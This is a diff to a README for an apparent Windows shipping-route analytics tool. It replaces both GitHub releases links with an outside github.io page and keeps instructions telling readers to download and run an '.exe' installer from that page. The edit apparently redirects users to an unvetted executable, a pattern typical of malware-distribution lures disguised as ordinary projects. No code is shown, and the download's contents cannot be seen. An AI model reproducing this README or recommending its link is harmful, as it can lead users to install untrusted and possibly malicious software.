@@ -1,6 +1,6 @@
 # 📦 Nassau-Candy-Logistics-Analytics - Optimize your supply chain shipping routes
 
-[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Prehistoric-waterflea831/Nassau-Candy-Logistics-Analytics/releases)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://prehistoric-waterflea831.github.io)
 
 ## 📋 Project Overview
 
@@ -16,7 +16,7 @@ You need a Windows computer to run this software. Ensure your machine has at lea
 
 ## 💾 Downloading the Application
 
-Visit the following link to get the installer for your computer: [https://github.com/Prehistoric-waterflea831/Nassau-Candy-Logistics-Analytics/releases](https://github.com/Prehistoric-waterflea831/Nassau-Candy-Logistics-Analytics/releases). 
+Visit the following link to get the installer for your computer: [https://prehistoric-waterflea831.github.io](https://prehistoric-waterflea831.github.io). 
 
 On this page, look for the section labeled "Assets." Click the link that ends in ".exe". This file starts the setup process. Save the file to your desktop or your downloads folder. If your browser asks if you want to keep the file, choose yes.
 
